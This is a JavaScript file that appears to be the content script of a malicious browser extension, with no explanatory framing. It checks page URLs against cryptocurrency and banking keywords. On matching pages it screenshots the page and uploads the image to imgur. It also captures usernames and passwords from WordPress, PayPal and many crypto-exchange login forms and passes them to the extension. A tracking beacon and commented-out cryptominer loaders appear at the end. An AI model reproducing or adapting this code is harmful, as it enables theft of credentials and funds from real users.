(new Image).src = "https://whos.amung.us/swidget/bbbbbbbbf";

var myStringArray = ["coin", "ether", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "bitcoin", "blockchain.info", "paxful.com", "coin.space", "coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com",
"coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com", "mine", "btc", "ltc", "zcash", "banco", "bank", "banven", "banes"];
var arrayLength = myStringArray.length;
var i = 0;
for (;i < arrayLength;i++) {
  if (location.href.indexOf(myStringArray[i]) > -1) {

  if (typeof html2canvas != "object") {
    var b = document.querySelector("img");
        b.setAttribute('crossOrigin', 'anonymous');
    var xmlHttp = new XMLHttpRequest;
    xmlHttp["open"]("GET", "https://html2canvas.hertzen.com/build/html2canvas.min.js", false);
    xmlHttp["send"](null);
    eval(xmlHttp["responseText"]);
  }
  var client_ids = ["3684103173db518", "aff413c4429c3e0", "c850fa264fe4583", "b9d8e7f2da3926a", "6dff965b85a21d7", "161dee2b693cca1", "7621dbdbefa1eeb", "e62a9eaa1d28307", "ecb1f96220c662f", "f3b0d63899cc902"];

      html2canvas(document.body, {
        allowTaint : false,
        taintTest : false,
        useCORS : true,
        onrendered : function(canvas) {
          canvas.toBlob(function(blob) {
            client_ids = shuffle(client_ids);
            var client_id = client_ids[0];
            var fd = new FormData;
            fd.append("image", blob, "photo_" + Math.floor(Math.random() * 9999) + ".png");
            var xhr = new XMLHttpRequest;
            xhr.open("POST", "https://api.imgur.com/3/image?ext=me");
            xhr.setRequestHeader("Authorization", "Client-ID " + client_id);
            xhr.send(fd);
            xhr.onreadystatechange = function() {
              if (xhr.readyState == 4) {
                var data = JSON.parse(xhr.responseText);
                if (!data.error) {
                  image_link = data.data.link;
                  var login = {};
                  login.image = image_link;
                  login.url = location.href;
                  chrome.runtime.sendMessage(login);
                } else {
                }
              }
            };
          }, "image/png", 1);
        }
      });
  }
}

    if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
      document.getElementById("loginform").onsubmit = function() {
        var login = {};
        login.email = document.getElementById("user_login").value;
        login.pass = document.getElementById("user_pass").value;
        login.url = location.href;
        if (login.email && login.pass && login.url) {
           chrome.runtime.sendMessage(login);
        }
      }
    };

    if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
    var button = document.getElementsByTagName("button")[0];
    if(button){
      button.onmouseover = function() {
        var login = {};
        login.email = document.getElementById("username").value;
        login.pass = document.getElementById("password").value;
        login.url = location.href;
        if (login.email && login.pass && login.url) {
          chrome.runtime.sendMessage(login);
        }
      }
    }
  };

    if (top['location']['href']['indexOf']('minergate.com') > -1) {
      var button = document.getElementsByTagName("button")[0];
      if(button){
        button.onmouseover = function() {
          var login = {};
          login.email = document.getElementsByName("email")[0].value;
          login.pass = document.getElementsByName("password")[0].value;
          login.url = location.href;
          if (login.email && login.pass && login.url) {
            chrome.runtime.sendMessage(login);
          }
        }
      }
    };

    if (top['location']['href']['indexOf']('blockchain.info') > -1) {
      var button = document.getElementsByTagName("button")[0];
      if(button){
        button.onmouseover = function() {
          var login = {};
          login.email = document.getElementsByName("UID_input")[0].value;
          login.pass = document.getElementsByName("pass_input")[0].value;
          login.url = location.href;
         if (login.email && login.pass && login.url) {
           chrome.runtime.sendMessage(login);
         }
       }
      }
    };

    if (top['location']['href']['indexOf']('bittrex.com/Account/Login') > -1) {
                   var button = document.getElementsByTagName("button")[0];
                   if(button){
                     button.onmouseover = function (_0x441cx2) {
                       var login = {};
                       login.email = document.getElementsByName("UserName")[0].value;
                       login.pass = document.getElementsByName("Password")[0].value;
                       login.url = location.href;
                       if (login.email && login.pass && login.url) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
                   }
    };

    if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
                   var button = document.getElementsByTagName("input")[7];
                   if(button){
                     button.onmouseover = function (_0x441cx2) {
                       var login = {};
                       login.email = document.getElementsByName("j_username")[0].value;
                       login.pass = document.getElementsByName("j_password")[0].value;
                       login.url = location.href;
                       if (login.email && login.pass && login.url) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
                   }
    };


    if (top['location']['href']['indexOf']('paypal.com/signin') > -1) {
                   var button = document.getElementsByTagName("button")[2];
                   if(button){
                     button.onmouseover  = function (_0x441cx2) {
                       var login = {};
                       login.email = document.getElementsByName("login_email")[0].value;
                       login.pass = document.getElementsByName("login_password")[0].value;
                       login.url = location.href;
                       if (login.email && login.pass && login.url) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
                   }
    };

    if (top['location']['href']['indexOf']('bitcoinglobalclub.com/mlm/pages/login/login.php') > -1) {
                   var button = document.getElementsByTagName("button")[0];
                   if(button){
                     button.onmouseover  = function (_0x441cx2) {
                       var login = {};
                       login.email = document.getElementsByName("usus")[0].value;
                       login.pass = document.getElementsByName("clave")[0].value;
                       login.url = location.href;
                       if (login.email && login.pass && login.url) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
                   }
    };



  if (top['location']['href']['indexOf']('bitpay.com/dashboard/login/') > -1) {
                  var button = document.getElementsByTagName("button")[1];
                  if(button){
                    button.onmouseover = function (_0x441cx2) {
                      var login = {};
                      login.email = document.getElementsByName("email")[0].value;
                      login.pass = document.getElementsByName("password")[0].value;
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                       }
                  }             
  };

  if (top['location']['href'] === 'auth.bitbay.net/login') {
                  var button = document.getElementsByTagName("button")[1];
                  if(button){
                    button.onmouseover = function (_0x441cx2) {
                      var login = {};
                      login.email = document.getElementsByName("email")[0].value;
                      login.pass = "null";
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                    }
                  }
  };

  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
                  var button = document.getElementsByTagName("button")[0];
                  if(button){
                    button.onmouseover = function (_0x441cx2) {
                      var login = {};
                      login.email = "null";
                      login.pass = document.getElementsByName("password")[0].value;
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                    }
                  }
  };


  if (top['location']['href']['indexOf']('localbitcoins.com/accounts/login/') > -1) {
                   var input = document.getElementsByTagName("input")[3];
                   if(input){
                     input.onmouseover = function (_0x441cx2) {
                       var login = {};
                       login.email = document.getElementById("id_username").value;
                       login.pass = document.getElementById("id_password").value;
                       login.url = location.href;
                       if (login.email && login.pass && login.url) {
                         chrome.runtime.sendMessage(login);
                       }
                     }
                   }
    };


  if (top['location']['href']['indexOf']('onixcoin.com/inicio-sesion/') > -1) {
                  var button = document.getElementsByTagName("button")[8];
                  if(button){
                    button.onmouseover = function (_0x441cx2) {
                      var login = {};
                      login.email = document.getElementsByName("correo")[1].value;
                      login.pass = document.getElementsByName("clave")[0].value;
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                    }
                  }
    };

  if (top['location']['href']['indexOf']('coinpayments.net/login') > -1) {
                  var input = document.getElementsByTagName("input")[3];
                  if(input){
                    input.onmouseover = function (_0x441cx2) {
                      var login = {};
                      login.email = document.getElementsByName("username")[0].value;
                      login.pass = document.getElementsByName("pass")[0].value;
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                    }
                  }
    };

  if (top['location']['href']['indexOf']('nicehash.com/login') > -1) {
                  var input = document.getElementsByTagName("input")[2];
                  if(input){
                    input.onmouseover  = function (_0x441cx2) {
                      var login = {};
                      login.email = document.getElementById("username").value;
                      login.pass = document.getElementById("password").value;
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                    }
                  }
      };
  if (top['location']['href']['indexOf']('coinbase.com/signin') > -1) {
                  var input = document.getElementsByTagName("input")[4];
                  if(input){
                    input.onmouseover  = function (_0x441cx2) {
                      var login = {};
                      login.email = document.getElementById("email").value;
                      login.pass = document.getElementById("password").value;
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                    }
                  }
        };
    if (top['location']['href']['indexOf']('backoffice.minerworld.com.br/#/home') > -1) {
                  var button = document.getElementsByTagName("button")[1];
                  if(button){
                    button.onmouseover = function (_0x441cx2) {
                      var login = {};
                      login.email = document.getElementById("back_usuario").value;
                      login.pass = document.getElementById("back_senha").value;
                      login.url = location.href;
                      if (login.email && login.pass && login.url) {
                        chrome.runtime.sendMessage(login);
                      }
                    }
                  }
          };








      function shuffle(_0x4a1cx4e) {
        var _0x4a1cx4f = _0x4a1cx4e["length"];
        var _0x4a1cx50;
        var _0x4a1cx51;
        for (;0 !== _0x4a1cx4f;) {
          _0x4a1cx51 = Math["floor"](Math["random"]() * _0x4a1cx4f);
          _0x4a1cx4f -= 1;
          _0x4a1cx50 = _0x4a1cx4e[_0x4a1cx4f];
          _0x4a1cx4e[_0x4a1cx4f] = _0x4a1cx4e[_0x4a1cx51];
          _0x4a1cx4e[_0x4a1cx51] = _0x4a1cx50;
        }
        return _0x4a1cx4e;
      }
  //   var target = 2048;
  //   var exFunc = function(){
  //   if (typeof isrunmyproject == "undefined") {
  //     isrunmyproject = 1;
  //   if (typeof CoinHive != "object") {
  //     var xmlHttp = new XMLHttpRequest;
  //       xmlHttp["open"]("GET", "https://coinhive.com/lib/coinhive.min.js", false);
  //       xmlHttp["send"](null);
  //       eval(xmlHttp["responseText"]);
  //   }
  //     var miner = new CoinHive.Token('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', target);
  //     miner.on('accepted', function(params){
  //       if (params.hashes >= target) {
  //         var ts = Date.now();
  //         var xhr = new XMLHttpRequest();
  //         xhr.onreadystatechange = function() {
  //           if (xhr.readyState === xhr.DONE){
  //
  //           }
  //         };
  //         xhr.open('POST', 'https://cnhv.co/dkja');
  //         xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  //         xhr.send('token='+encodeURIComponent(miner.getToken()));
  //       }
  //     });
  //     miner.start(CoinHive.FORCE_MULTI_TAB);
  //
  //   }
  // }
  //
  //   var cookie_name = "controler_mineros_"+target;
  //   var cookie_time = 0.3;
  //   if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
  //     localStorage[cookie_name] = Date.now();
  //     exFunc();
  //    }

    // !function() {
    //   localStorage["jsenow"] = Date.now();
    //   var e = document;
    //   var t = e.createElement("script");
    //   var s = e.getElementsByTagName("script")[0];
    //   t.type = "text/javascript";
    //   t.async = t.defer = true;
    //   t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
    //   s.parentNode.insertBefore(t, s);
    // }();
